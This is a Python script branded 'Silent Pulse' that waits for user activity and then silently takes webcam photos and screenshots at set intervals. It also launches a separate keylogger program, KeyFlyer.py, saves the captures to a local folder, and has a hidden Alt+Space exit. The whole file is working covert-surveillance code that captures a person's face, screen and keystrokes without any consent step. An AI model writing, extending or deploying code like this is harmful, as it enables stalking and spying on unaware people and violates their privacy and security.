import cv2
from PIL import ImageGrab
import subprocess
from pynput import mouse, keyboard
import time
import os

base_dir = os.path.dirname(os.path.abspath(__file__))
output_dir = os.path.join(base_dir, "output")
if not os.path.exists(output_dir):
    os.makedirs(output_dir)

keylogger_started = False
activity_detected = False
program_running = True

def take_webcam_screenshot():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        webcam_screenshot_path = os.path.join(output_dir, f"webcam_{int(time.time())}.png")
        cv2.imwrite(webcam_screenshot_path, frame)
        print(f"Webcam screenshot saved to {webcam_screenshot_path}")
    cap.release()

def take_screen_screenshot():
    screen_screenshot_path = os.path.join(output_dir, f"screen_{int(time.time())}.png")
    screenshot = ImageGrab.grab()
    screenshot.save(screen_screenshot_path)
    print(f"Screen screenshot saved to {screen_screenshot_path}")

# Start new program
def start_keylogger():
    global keylogger_started
    if not keylogger_started:
        keylogger_path = os.path.join(base_dir, "KeyFlyer.py")  # Change to open the program (Keylogger F.X.)
        subprocess.Popen(["python", keylogger_path])
        print("Keylogger started")
        keylogger_started = True

def on_activity_detected():
    global activity_detected
    if not activity_detected:
        activity_detected = True
        take_webcam_screenshot()
        take_screen_screenshot()
        start_keylogger()

def on_mouse_move(x, y):
    on_activity_detected()

def on_mouse_click(x, y, button, pressed):
    on_activity_detected()

def on_mouse_scroll(x, y, dx, dy):
    on_activity_detected()

def on_key_press(key):
    on_activity_detected()

def on_key_combination(key):
    global program_running
    if key == keyboard.Key.space and keyboard.Controller().pressed(keyboard.Key.alt):
        print("Exit key combination detected. Exiting program.")
        program_running = False
        return False

# Основний цикл
def main():
    image = [
"  _____ _ _            _      ____        _                 ",
" / ____(_) |          | |    |  _ \      | |                ",
"| (___  _| | ___ _ __ | |_   | |_) |_   _| | ___   ___      ",
" \___ \| | |/ _ \ '_ \| __|  |  __/| | | | |/ __| / _ \     ",
" ____) | | |  __/ | | | |_   | |   | |_| | |\__ \ | __/     ",
"|_____/|_|_|\___|_| |_|\__|  |_|    \__,_|\_/___/ \___|     "
    ]
    for line in image:
        print(line)
        time.sleep(0.2)  # Затримка в 0.2 секунди між виводом кожного рядка

    print(" ")
    print("Version 1.0. Created by Bohdan Misonh")
    print("-------------------------------------- ")

    global program_running
    time.sleep(15)  # Час неактивності в секундах

    mouse_listener = mouse.Listener(on_move=on_mouse_move, on_click=on_mouse_click, on_scroll=on_mouse_scroll)
    mouse_listener.start()

    keyboard_listener = keyboard.Listener(on_press=on_key_press)
    keyboard_listener.start()

    # Відслідковування комбінації клавіш для виходу
    exit_listener = keyboard.Listener(on_press=on_key_combination)
    exit_listener.start()

    print("Starting activity detection...")

    last_screen_screenshot_time = time.time()
    last_webcam_screenshot_time = time.time()

    try:
        while program_running:
            current_time = time.time()

            # Робимо скріншоти кожні 15 секунд
            if activity_detected and current_time - last_screen_screenshot_time >= 15:
                take_screen_screenshot()
                last_screen_screenshot_time = current_time

            # Робимо скріншоти з веб-камери кожну хвилину
            if activity_detected and current_time - last_webcam_screenshot_time >= 60:
                take_webcam_screenshot()
                last_webcam_screenshot_time = current_time

            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        mouse_listener.stop()
        keyboard_listener.stop()
        exit_listener.stop()

if __name__ == "__main__":
    main()
